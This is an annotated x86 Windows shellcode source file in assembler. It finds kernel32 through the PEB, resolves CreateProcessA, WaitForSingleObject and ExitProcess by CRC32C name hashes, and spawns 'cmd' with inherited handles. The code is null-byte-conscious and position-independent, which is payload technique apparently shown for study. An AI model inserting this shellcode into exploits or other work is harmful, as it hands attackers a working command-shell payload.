    .section .shcode, "ax"
/* MinGW entrypoint is either _mainCRTStartup or _WinMainCRTStartup
 * Define symbols with storage class 2 (IMAGE_SYM_CLASS_EXTERNAL), and object
 * type 32 (function), for COFF Symbol Table.
 */
    .globl _mainCRTStartup
    .def _mainCRTStartup; .scl 2; .type 32; .endef
    .set _mainCRTStartup, _start
    .globl _WinMainCRTStartup
    .def _WinMainCRTStartup; .scl 2; .type 32; .endef
    .set _WinMainCRTStartup, _start
    .globl _start
    .def _start; .scl 2; .type 32; .endef
_start:
    /* fc                */  cld                            /* Clear direction flag */
    /* eb 76             */  jmp    start                   /* Make relative calls negative */

/* Call the function in kernel32 identified by hash in eax */
call_by_hash:
    /* 60                */  pusha                          /* Push eax, ecx, edx, ebx, */
    /* 31 c0             */  xor    %eax, %eax              /*   orig_esp, ebp, esi, edi */
    /* 64 8b 40 30       */  mov    %fs:0x30(%eax), %eax
    /* 8b 40 0c          */  mov    0xc(%eax), %eax         /* eax = PEB->Ldr */
    /* 8b 58 0c          */  mov    0xc(%eax), %ebx         /* ebx = Ldr->InLoadOrderModuleList.Flink */

_find_kernel_module:
    /* 89 de             */  mov    %ebx, %esi              /* Check that the module name begins with K */
    /* ad                */  lods   %ds:(%esi), %eax        /*   because ntdll might be there. */
    /* 89 c3             */  mov    %eax, %ebx              /* ebx = ebx->InLoadOrderLinks.Flink */
    /* 8b 70 30          */  mov    0x30(%eax), %esi        /* esi = ebx->BaseDllName */
    /* ac                */  lods   %ds:(%esi), %al
    /* 24 df             */  and    $0xdf, %al              /* al = toupper(esi[0]) */
    /* 3c 4b             */  cmp    $0x4b, %al
    /* 75 f1             */  jne    _find_kernel_module     /* Loop if not 'K' */

    /* 8b 6b 18          */  mov    0x18(%ebx), %ebp        /* ebp = ebx->DllBase */
    /* 8b 45 3c          */  mov    0x3c(%ebp), %eax        /* eax = IMAGE_DOS_HEADER->e_lfanew */
    /* 8b 5c 05 78       */  mov    0x78(%ebp, %eax, 1), %ebx
                                                            /* ebx = IMAGE_NT_HEADERS->OptionalHeader */
                                                            /*   .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT] */
                                                            /*   .VirtualAddress */
    /* 8d 5c 1d f0       */  lea    -0x10(%ebp, %ebx, 1), %ebx
                                                            /* ebx = IMAGE_EXPORT_DIRECTORY - 0x10 to avoid a 0x20 */
    /* 8b 4b 28          */  mov    0x28(%ebx), %ecx        /* ecx = ebx->NumberOfNames */
    /* 8b 7b 30          */  mov    0x30(%ebx), %edi        /* edi = ebx->AddressOfNames */
    /* 01 ef             */  add    %ebp, %edi

_find_function:
    /* e3 fe             */  jecxz  .                       /* Loop forever if function is not found */
    /* 49                */  dec    %ecx                    /* next function */
    /* 8b 34 8f          */  mov    (%edi, %ecx, 4), %esi
    /* 01 ee             */  add    %ebp, %esi              /* Compute CRC32C of esi = name: */
    /* 31 c0             */  xor    %eax, %eax              /*   eax = current char/bit index */
    /* 99                */  cltd                           /*   edx = hash (sign-extend eax to edx:eax) */
                                                            /*   ebx, ecx, edi, ebp: assigned */
_compute_hash_loop:
    /* ac                */  lods   %ds:(%esi), %al
    /* 84 c0             */  test   %al, %al
    /* 74 14             */  je     _hash_finished          /* End of name */
    /* 30 c2             */  xor    %al, %dl
    /* b0 08             */  mov    $0x8, %al               /* Repeat for 8 bits */
_compute_hash_bit:
    /* d1 ea             */  shr    %edx                    /* Shift edx and save carry */
    /* 73 06             */  jae    _skip_xor
    /* 81 f2 78 3b f6 82 */  xor    $0x82f63b78, %edx       /* Reversed Castagnoli polynomial */
_skip_xor:
    /* fe c8             */  dec    %al
    /* 75 f2             */  jne    _compute_hash_bit
    /* eb e7             */  jmp    _compute_hash_loop

_hash_finished:
    /* 3b 54 24 1c       */  cmp    0x1c(%esp), %edx        /* Compare hash with saved eax */
    /* 75 d6             */  jne    _find_function          /* Loop back to _find_function */

    /* 8b 73 34          */  mov    0x34(%ebx), %esi        /* esi = ebx->AddressOfNameOrdinals */
    /* 01 ee             */  add    %ebp, %esi
    /* 0f b7 04 4e       */  movzwl (%esi, %ecx, 2), %eax   /* eax = 16-bit ordinal of function #ecx */
    /* 8b 73 2c          */  mov    0x2c(%ebx), %esi        /* esi = ebx->AddressOfFunctions */
    /* 01 ee             */  add    %ebp, %esi
    /* 8b 04 86          */  mov    (%esi, %eax, 4), %eax
    /* 01 e8             */  add    %ebp, %eax              /* eax = function address */
    /* 89 44 24 1c       */  mov    %eax, 0x1c(%esp)        /* Restore all regs but eax */
    /* 61                */  popa
    /* 50                */  push   %eax                    /* Jump to found function */
    /* c3                */  ret

start:
    /* 68 01 63 6d 64    */  push   $0x646d6301             /* Push "\x1cmd" */
    /* 6a 50             */  push   $0x50                   /* Allocate 80 bytes for: */
    /* 59                */  pop    %ecx                    /*   PROCESS_INFORMATION (16) */
    /* 29 cc             */  sub    %ecx, %esp              /*   STARTUPINFO (68) */
    /* 89 e7             */  mov    %esp, %edi              /*   ... with size (-4) */
    /* 31 c0             */  xor    %eax, %eax              /* ZeroMemory */
    /* f3 aa             */  rep stos %al, %es:(%edi)       /*  ... and ecx = 0 */
    /* c1 2f 08          */  shrl   $0x8, (%edi)            /*  ... and edi = "cmd" */
    /* 6a 44             */  push   $0x44                   /* STARTUPINFO.cbSize = 68 */
    /* 8d 74 24 44       */  lea    0x44(%esp), %esi        /* esi = &PROCESS_INFORMATION */
    /* 89 e2             */  mov    %esp, %edx
    /* 56                */  push   %esi                    /* args(lpProcessInformation) = esi */
    /* 52                */  push   %edx                    /* args(lpStartupInfo) = &STARTUPINFO */
    /* 51                */  push   %ecx                    /* args(lpCurrentDirectory) = NULL */
    /* 51                */  push   %ecx                    /* args(lpEnvironment) = NULL */
    /* 6a 10             */  push   $0x10                   /* args(dwCreationFlags) = CREATE_NEW_CONSOLE */
    /* 6a 01             */  push   $0x1                    /* args(bInheritHandles) = TRUE */
    /* 51                */  push   %ecx                    /* args(lpThreadAttributes) = NULL */
    /* 51                */  push   %ecx                    /* args(lpProcessAttributes) = NULL */
    /* 57                */  push   %edi                    /* args(lpCommandLine) = edi */
    /* 51                */  push   %ecx                    /* args(lpApplicationName) = NULL */
    /* b8 24 05 1a 7a    */  mov    $0x7a1a0524, %eax       /* Call CreateProcessA( */
                                                            /*     0x00(%esp): lpApplicationName */
                                                            /*     0x04(%esp): lpCommandLine  */
                                                            /*     0x08(%esp): lpProcessAttributes */
                                                            /*     0x0c(%esp): lpThreadAttributes */
                                                            /*     0x10(%esp): bInheritHandles */
                                                            /*     0x14(%esp): dwCreationFlags */
                                                            /*     0x18(%esp): lpEnvironment */
                                                            /*     0x1c(%esp): lpCurrentDirectory */
                                                            /*     0x20(%esp): lpStartupInfo */
                                                            /*     0x24(%esp): lpProcessInformation */
    /* e8 59 ff ff ff    */  call   call_by_hash            /* ) */

    /* 6a ff             */  push   $0xffffffff             /* args(dwMilliseconds) = INFINITE */
    /* ad                */  lods   %ds:(%esi), %eax
    /* 50                */  push   %eax                    /* args(hHandle) = esi->hProcess */
    /* b8 76 51 94 d8    */  mov    $0xd8945176, %eax       /* Call WaitForSingleObject */
_exit_loop:
    /* e8 4b ff ff ff    */  call   call_by_hash
    /* 31 c9             */  xor    %ecx, %ecx
    /* 51                */  push   %ecx                    /* args(uExitCode) = 0 */
    /* b8 d5 a5 c9 42    */  mov    $0x42c9a5d5, %eax       /* Call ExitProcess */
    /* eb f1             */  jmp    _exit_loop
